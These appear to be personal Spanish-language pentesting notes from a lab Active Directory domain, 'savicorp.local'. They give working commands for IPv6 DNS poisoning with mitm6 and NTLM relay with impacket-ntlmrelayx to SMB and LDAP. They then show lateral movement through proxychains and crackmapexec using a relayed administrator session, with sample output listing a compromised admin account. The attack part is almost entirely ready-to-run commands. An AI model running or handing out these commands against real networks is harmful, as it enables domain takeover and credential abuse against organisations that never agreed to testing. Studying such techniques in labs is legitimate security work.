Teoricamente esto deberia funcionar pero no hace nada lo que si funciona es envenenar la red por ipv6 y le pone como dns primario el de ipv6 de nuestro equipo

Aqui lo que haremos sera envenenar el dominio entero de la empresa pero por IPV6 para obtener los usuarios con la herramienta 

Las maquinas Windows por defecto solicitan trafico ipv6

```
sudo mitm6 -d savicorp.local -i ens33

sudo mitm6 -d savicorp.local -i ens33 --domain savicorp.local

sudo mitm6 -d savicorp.local -i ens33 --verbose --ignore-nofqdn
```

Intentaremos mediante samba obtener un relay de una cuenta administrativa que no necesitaremos descifrar la password para poder conectar con algún equipo donde esta cuenta tenga privilegios
```
sudo impacket-ntlmrelayx -6 -wh 192.168.38.140 -wa 3 -t smb://192.168.38.139 -socks -debug -smb2support

Esto da una consola interactiva 
Ctrl+l 

ntlmrelayx> socks
Protocol  Target          Username           AdminStatus  Port 
--------  --------------  -----------------  -----------  ----
SMB       192.168.38.139  S4VICORP/MVASQUEZ  TRUE         445  
```

Con la cuenta comprometida y con privilegios con ProxyChain podemos utiliar esta cuenta para hacer conecciones a equipos

```
proxychain cme smb 192.168.94.138 -u 'mvazquez' -p 'sadasda' -d 'savicorp'
```

```
sudo impacket-ntlmrelayx -6 -t ldap://10.10.11.130 -smb2support -wh pcfalsa.savicorp.local -l dumpedFiles
```